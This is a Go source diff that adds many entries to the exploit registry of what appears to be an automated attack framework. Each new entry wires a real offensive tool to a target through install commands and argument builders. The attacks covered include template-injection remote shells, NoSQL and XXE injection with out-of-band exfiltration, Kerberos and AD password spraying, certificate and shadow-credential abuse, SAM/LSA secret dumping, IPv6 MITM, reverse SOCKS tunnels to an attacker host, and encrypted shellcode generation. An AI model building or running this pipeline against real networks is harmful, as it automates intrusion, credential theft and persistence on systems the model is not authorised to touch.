@@ -143,7 +143,144 @@ var exploitRegistry = []ToolSpec{
 		},
 	},
 
-	// PHASE 2 — AUTH ATTACKS
+	// ── NEW 2025: tplmap — SSTI to RCE exploitation ──
+	{
+		Name: "tplmap", Phase: 1, Timeout: 3600,
+		VulnTypes:   []string{"all", "rce", "ssti"},
+		InstallHint: "git clone https://github.com/epinna/tplmap /opt/tplmap && pip3 install -r /opt/tplmap/requirements.txt --break-system-packages && sudo tee /usr/local/bin/tplmap > /dev/null <<'EOF'\n#!/bin/bash\npython3 /opt/tplmap/tplmap.py \"$@\"\nEOF\nsudo chmod +x /usr/local/bin/tplmap",
+		InstallCmd:  "git clone https://github.com/epinna/tplmap /opt/tplmap && pip3 install -r /opt/tplmap/requirements.txt --break-system-packages && sudo tee /usr/local/bin/tplmap > /dev/null <<'EOF'\n#!/bin/bash\npython3 /opt/tplmap/tplmap.py \"$@\"\nEOF\nsudo chmod +x /usr/local/bin/tplmap",
+		BuildArgs: func(target string, ctx *AbhimanyuContext) []string {
+			u := target
+			if !strings.HasPrefix(u, "http") {
+				u = "https://" + u
+			}
+			return []string{
+				"-u", u,
+				"--level", "5",
+				"--os-shell",
+				"--os-cmd", "id;whoami;uname -a",
+				"--engine", "Jinja2,Twig,Smarty,Mako,Tornado,Freemarker,Velocity,ERB,Nunjucks",
+			}
+		},
+		FallbackArgs: []func(target string, ctx *AbhimanyuContext) []string{
+			func(target string, ctx *AbhimanyuContext) []string {
+				u := target
+				if !strings.HasPrefix(u, "http") {
+					u = "https://" + u
+				}
+				return []string{"-u", u, "--level", "3", "--os-cmd", "id"}
+			},
+		},
+	},
+
+	// ── NEW 2025: nosqlmap — NoSQL injection (MongoDB, CouchDB, Redis) ──
+	{
+		Name: "nosqlmap", Phase: 1, Timeout: 3600,
+		VulnTypes:   []string{"all", "sqli", "nosql"},
+		InstallHint: "git clone https://github.com/codingo/NoSQLMap /opt/nosqlmap && pip3 install -r /opt/nosqlmap/requirements.txt --break-system-packages && sudo tee /usr/local/bin/nosqlmap > /dev/null <<'EOF'\n#!/bin/bash\npython3 /opt/nosqlmap/nosqlmap.py \"$@\"\nEOF\nsudo chmod +x /usr/local/bin/nosqlmap",
+		InstallCmd:  "git clone https://github.com/codingo/NoSQLMap /opt/nosqlmap && pip3 install -r /opt/nosqlmap/requirements.txt --break-system-packages && sudo tee /usr/local/bin/nosqlmap > /dev/null <<'EOF'\n#!/bin/bash\npython3 /opt/nosqlmap/nosqlmap.py \"$@\"\nEOF\nsudo chmod +x /usr/local/bin/nosqlmap",
+		BuildArgs: func(target string, ctx *AbhimanyuContext) []string {
+			u := target
+			if !strings.HasPrefix(u, "http") {
+				u = "https://" + u
+			}
+			return []string{
+				"--attack", "2",   // web app attack
+				"--uri", u,
+				"--httpMethod", "POST",
+				"--verbose",
+			}
+		},
+		FallbackArgs: []func(target string, ctx *AbhimanyuContext) []string{
+			func(target string, ctx *AbhimanyuContext) []string {
+				u := target
+				if !strings.HasPrefix(u, "http") {
+					u = "https://" + u
+				}
+				return []string{"--attack", "1", "--uri", u}
+			},
+		},
+	},
+
+	// ── NEW 2025: xxeinjector — XXE exploitation automation ──
+	{
+		Name: "xxeinjector", Phase: 1, Timeout: 1800,
+		VulnTypes:   []string{"all", "xxe", "rce"},
+		InstallHint: "git clone https://github.com/enjoiz/XXEinjector /opt/xxeinjector && sudo tee /usr/local/bin/xxeinjector > /dev/null <<'EOF'\n#!/bin/bash\nruby /opt/xxeinjector/XXEinjector.rb \"$@\"\nEOF\nsudo chmod +x /usr/local/bin/xxeinjector",
+		InstallCmd:  "git clone https://github.com/enjoiz/XXEinjector /opt/xxeinjector && sudo tee /usr/local/bin/xxeinjector > /dev/null <<'EOF'\n#!/bin/bash\nruby /opt/xxeinjector/XXEinjector.rb \"$@\"\nEOF\nsudo chmod +x /usr/local/bin/xxeinjector",
+		BuildArgs: func(target string, ctx *AbhimanyuContext) []string {
+			u := target
+			if !strings.HasPrefix(u, "http") {
+				u = "https://" + u
+			}
+			return []string{
+				"--host", u,
+				"--path", "/",
+				"--file", "/tmp/cybermind_xxe_request.xml",
+				"--oob", "http",
+				"--phpfilter",
+				"--verbose",
+			}
+		},
+		FallbackArgs: []func(target string, ctx *AbhimanyuContext) []string{
+			func(target string, ctx *AbhimanyuContext) []string {
+				u := target
+				if !strings.HasPrefix(u, "http") {
+					u = "https://" + u
+				}
+				return []string{"--host", u, "--path", "/", "--oob", "http"}
+			},
+		},
+	},
+
+	// ── NEW 2025: kerbrute — Kerberos user enumeration + password spray ──
+	{
+		Name: "kerbrute", Phase: 2, Timeout: 3600,
+		VulnTypes:   []string{"all", "auth", "ad", "brute"},
+		InstallHint: "go install github.com/ropnop/kerbrute@latest",
+		InstallCmd:  "go install github.com/ropnop/kerbrute@latest",
+		BuildArgs: func(target string, ctx *AbhimanyuContext) []string {
+			return []string{
+				"userenum",
+				"--dc", target,
+				"-d", target,
+				"/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt",
+				"--output", "/tmp/cybermind_kerbrute_users.txt",
+				"-t", "50",
+			}
+		},
+		FallbackArgs: []func(target string, ctx *AbhimanyuContext) []string{
+			func(target string, ctx *AbhimanyuContext) []string {
+				return []string{"userenum", "--dc", target, "-d", target, "/usr/share/wordlists/metasploit/unix_users.txt", "-t", "20"}
+			},
+			func(target string, ctx *AbhimanyuContext) []string {
+				return []string{"passwordspray", "--dc", target, "-d", target, "/usr/share/wordlists/metasploit/unix_users.txt", "Password123", "-t", "10"}
+			},
+		},
+	},
+
+	// ── NEW 2025: sprayhound — AD password spraying with lockout protection ──
+	{
+		Name: "sprayhound", Phase: 2, Timeout: 3600,
+		VulnTypes:   []string{"all", "auth", "ad"},
+		InstallHint: "pip3 install sprayhound --break-system-packages",
+		InstallCmd:  "pip3 install sprayhound --break-system-packages",
+		BuildArgs: func(target string, ctx *AbhimanyuContext) []string {
+			return []string{
+				"-u", target,
+				"-p", "Password123",
+				"--dc", target,
+				"--safe",      // lockout-safe mode
+				"-t", "5",
+			}
+		},
+		FallbackArgs: []func(target string, ctx *AbhimanyuContext) []string{
+			func(target string, ctx *AbhimanyuContext) []string {
+				return []string{"-u", target, "-p", "Welcome1", "--dc", target, "--safe"}
+			},
+		},
+	},
+
 	{
 		Name: "hydra", Phase: 2, Timeout: 7200,
 		VulnTypes:   []string{"all", "auth", "brute"},
@@ -299,6 +436,75 @@ var exploitRegistry = []ToolSpec{
 		},
 	},
 
+	// ── NEW 2025: certipy — AD Certificate Services attacks (ESC1-ESC8) ──
+	{
+		Name: "certipy", Phase: 4, Timeout: 1800,
+		VulnTypes:   []string{"all", "postexploit", "ad", "privesc"},
+		InstallHint: "pip3 install certipy-ad --break-system-packages",
+		InstallCmd:  "pip3 install certipy-ad --break-system-packages",
+		BuildArgs: func(target string, ctx *AbhimanyuContext) []string {
+			return []string{
+				"find",
+				"-u", "administrator",
+				"-p", "",
+				"-dc-ip", target,
+				"-vulnerable",
+				"-stdout",
+			}
+		},
+		FallbackArgs: []func(target string, ctx *AbhimanyuContext) []string{
+			func(target string, ctx *AbhimanyuContext) []string {
+				return []string{"find", "-u", "guest", "-p", "", "-dc-ip", target, "-vulnerable"}
+			},
+		},
+	},
+
+	// ── NEW 2025: bloodyAD — AD privilege escalation without Mimikatz ──
+	{
+		Name: "bloodyAD", Phase: 4, Timeout: 1800,
+		VulnTypes:   []string{"all", "postexploit", "ad", "privesc"},
+		InstallHint: "pip3 install bloodyAD --break-system-packages",
+		InstallCmd:  "pip3 install bloodyAD --break-system-packages",
+		BuildArgs: func(target string, ctx *AbhimanyuContext) []string {
+			return []string{
+				"--host", target,
+				"-u", "administrator",
+				"-p", "",
+				"get", "object", "DC=domain,DC=local",
+				"--attr", "ms-DS-MachineAccountQuota",
+			}
+		},
+		FallbackArgs: []func(target string, ctx *AbhimanyuContext) []string{
+			func(target string, ctx *AbhimanyuContext) []string {
+				return []string{"--host", target, "-u", "guest", "-p", "", "get", "object", "DC=domain,DC=local"}
+			},
+		},
+	},
+
+	// ── NEW 2025: ldeep — deep LDAP enumeration ──
+	{
+		Name: "ldeep", Phase: 4, Timeout: 600,
+		VulnTypes:   []string{"all", "postexploit", "ad"},
+		InstallHint: "pip3 install ldeep --break-system-packages",
+		InstallCmd:  "pip3 install ldeep --break-system-packages",
+		BuildArgs: func(target string, ctx *AbhimanyuContext) []string {
+			return []string{
+				"ldap",
+				"-u", "anonymous",
+				"-p", "",
+				"-d", target,
+				"-s", fmt.Sprintf("ldap://%s", target),
+				"all",
+				"-o", "/tmp/cybermind_ldeep/",
+			}
+		},
+		FallbackArgs: []func(target string, ctx *AbhimanyuContext) []string{
+			func(target string, ctx *AbhimanyuContext) []string {
+				return []string{"ldap", "-u", "anonymous", "-p", "", "-d", target, "-s", fmt.Sprintf("ldap://%s", target), "users"}
+			},
+		},
+	},
+
 	// PHASE 5 — LATERAL MOVEMENT
 	{
 		Name: "crackmapexec", Phase: 5, Timeout: 3600,
@@ -352,6 +558,100 @@ var exploitRegistry = []ToolSpec{
 		},
 	},
 
+	// ── NEW 2025: coercer — Windows auth coercion (PetitPotam, PrinterBug, DFSCoerce) ──
+	{
+		Name: "coercer", Phase: 5, Timeout: 600,
+		VulnTypes:   []string{"all", "lateral", "ad"},
+		InstallHint: "pip3 install coercer --break-system-packages",
+		InstallCmd:  "pip3 install coercer --break-system-packages",
+		BuildArgs: func(target string, ctx *AbhimanyuContext) []string {
+			return []string{
+				"scan",
+				"-t", target,
+				"-u", "anonymous",
+				"-p", "",
+				"--always-continue",
+			}
+		},
+		FallbackArgs: []func(target string, ctx *AbhimanyuContext) []string{
+			func(target string, ctx *AbhimanyuContext) []string {
+				return []string{"scan", "-t", target, "--always-continue"}
+			},
+		},
+	},
+
+	// ── NEW 2025: mitm6 — IPv6 MITM attacks for AD credential capture ──
+	{
+		Name: "mitm6", Phase: 5, Timeout: 300,
+		VulnTypes:   []string{"all", "lateral", "ad", "network"},
+		InstallHint: "pip3 install mitm6 --break-system-packages",
+		InstallCmd:  "pip3 install mitm6 --break-system-packages",
+		BuildArgs: func(target string, ctx *AbhimanyuContext) []string {
+			return []string{
+				"-d", target,
+				"--ignore-nofqdn",
+			}
+		},
+		FallbackArgs: []func(target string, ctx *AbhimanyuContext) []string{
+			func(target string, ctx *AbhimanyuContext) []string {
+				return []string{"-d", target}
+			},
+		},
+	},
+
+	// ── NEW 2025: netexec — modern crackmapexec replacement (nxc) ──
+	{
+		Name: "netexec", Phase: 5, Timeout: 3600,
+		VulnTypes:   []string{"all", "lateral", "ad", "network"},
+		InstallHint: "pip3 install netexec --break-system-packages",
+		InstallCmd:  "pip3 install netexec --break-system-packages",
+		BuildArgs: func(target string, ctx *AbhimanyuContext) []string {
+			return []string{
+				"smb", target,
+				"--shares",
+				"-u", "administrator",
+				"-p", "",
+				"--pass-pol",
+				"--users",
+				"--groups",
+				"--sam",
+				"--lsa",
+				"--sessions",
+				"--loggedon-users",
+			}
+		},
+		FallbackArgs: []func(target string, ctx *AbhimanyuContext) []string{
+			func(target string, ctx *AbhimanyuContext) []string {
+				return []string{"smb", target, "--shares", "-u", "", "-p", ""}
+			},
+			func(target string, ctx *AbhimanyuContext) []string {
+				return []string{"ldap", target, "--users", "-u", "", "-p", ""}
+			},
+		},
+	},
+
+	// ── NEW 2025: pywhisker — Shadow Credentials attack ──
+	{
+		Name: "pywhisker", Phase: 5, Timeout: 600,
+		VulnTypes:   []string{"all", "lateral", "ad", "privesc"},
+		InstallHint: "pip3 install pywhisker --break-system-packages",
+		InstallCmd:  "pip3 install pywhisker --break-system-packages",
+		BuildArgs: func(target string, ctx *AbhimanyuContext) []string {
+			return []string{
+				"-d", target,
+				"-u", "administrator",
+				"-p", "",
+				"--action", "list",
+				"--target", "administrator",
+			}
+		},
+		FallbackArgs: []func(target string, ctx *AbhimanyuContext) []string{
+			func(target string, ctx *AbhimanyuContext) []string {
+				return []string{"-d", target, "-u", "guest", "-p", "", "--action", "list"}
+			},
+		},
+	},
+
 	// PHASE 6 — PERSISTENCE + EXFILTRATION
 	{
 		Name: "curl", Phase: 6, Timeout: 300,
@@ -386,6 +686,68 @@ var exploitRegistry = []ToolSpec{
 		FallbackArgs: []func(target string, ctx *AbhimanyuContext) []string{
 			func(target string, ctx *AbhimanyuContext) []string {
 				return []string{"-f", ctx.LHOST, fmt.Sprintf("t.%s", target)}
+			},
+		},
+	},
+
+	// ── NEW 2025: chisel — fast TCP/UDP tunnel over HTTP ──
+	{
+		Name: "chisel", Phase: 6, Timeout: 120,
+		VulnTypes:   []string{"all", "exfil", "tunnel", "lateral"},
+		InstallHint: "go install github.com/jpillora/chisel@latest",
+		InstallCmd:  "go install github.com/jpillora/chisel@latest",
+		BuildArgs: func(target string, ctx *AbhimanyuContext) []string {
+			return []string{
+				"server",
+				"--port", "8080",
+				"--reverse",
+				"--socks5",
+			}
+		},
+		FallbackArgs: []func(target string, ctx *AbhimanyuContext) []string{
+			func(target string, ctx *AbhimanyuContext) []string {
+				return []string{"client", fmt.Sprintf("http://%s:8080", ctx.LHOST), "R:socks"}
+			},
+		},
+	},
+
+	// ── NEW 2025: ligolo-ng — advanced tunneling for red teams ──
+	{
+		Name: "ligolo-ng", Phase: 6, Timeout: 120,
+		VulnTypes:   []string{"all", "exfil", "tunnel", "lateral"},
+		InstallHint: "go install github.com/nicocha30/ligolo-ng/cmd/proxy@latest && go install github.com/nicocha30/ligolo-ng/cmd/agent@latest",
+		InstallCmd:  "go install github.com/nicocha30/ligolo-ng/cmd/proxy@latest && go install github.com/nicocha30/ligolo-ng/cmd/agent@latest",
+		BuildArgs: func(target string, ctx *AbhimanyuContext) []string {
+			return []string{
+				"-selfcert",
+				"-laddr", "0.0.0.0:11601",
+			}
+		},
+		FallbackArgs: []func(target string, ctx *AbhimanyuContext) []string{
+			func(target string, ctx *AbhimanyuContext) []string {
+				return []string{"-selfcert", "-laddr", "0.0.0.0:443"}
+			},
+		},
+	},
+
+	// ── NEW 2025: donut — shellcode generation from .NET/PE/ELF ──
+	{
+		Name: "donut", Phase: 6, Timeout: 120,
+		VulnTypes:   []string{"all", "exfil", "evasion"},
+		InstallHint: "pip3 install donut-shellcode --break-system-packages",
+		InstallCmd:  "pip3 install donut-shellcode --break-system-packages",
+		BuildArgs: func(target string, ctx *AbhimanyuContext) []string {
+			return []string{
+				"-f", "/tmp/cybermind_payload.exe",
+				"-o", "/tmp/cybermind_shellcode.bin",
+				"-a", "2",     // x64
+				"-e", "3",     // encrypt
+				"-z", "2",     // compress
+			}
+		},
+		FallbackArgs: []func(target string, ctx *AbhimanyuContext) []string{
+			func(target string, ctx *AbhimanyuContext) []string {
+				return []string{"-f", "/tmp/cybermind_payload.exe", "-o", "/tmp/cybermind_shellcode.bin"}
 			},
 		},
 	},
